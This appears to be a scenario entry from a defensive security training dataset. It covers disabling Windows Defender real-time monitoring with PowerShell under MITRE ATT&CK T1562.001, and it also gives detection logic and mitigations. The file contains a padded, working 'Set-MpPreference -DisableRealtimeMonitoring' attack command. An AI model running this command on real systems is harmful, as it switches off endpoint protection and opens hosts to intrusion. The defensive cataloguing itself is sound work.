---
type: campaign
scenario_id: 16
tactic: Defense Evasion
technique: "T1562.001: Impair Defenses"
technique_id: T1562.001
tags: [campaign, lotl, defense_evasion]
---

# Disabling Windows Defender using PowerShell.

## Threat Description
Disabling Windows Defender using PowerShell.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Set-MpPreference -DisableRealtimeMonitoring $true"
```

## Detection Logic
Monitor Defender settings: `Get-MpPreference | Select-Object DisableRealtimeMonitoring`; Event ID 5001.

## Mitigation
Restrict Defender modifications: `reg add HKLM\Software\Policies\Microsoft\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 0`; Enable tamper protection.

## AI Training Prompt
Train AI to detect Defender tampering and suggest tamper protection.

## References
- MITRE ATT&CK T1562.001: https://attack.mitre.org/techniques/T1562/001/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
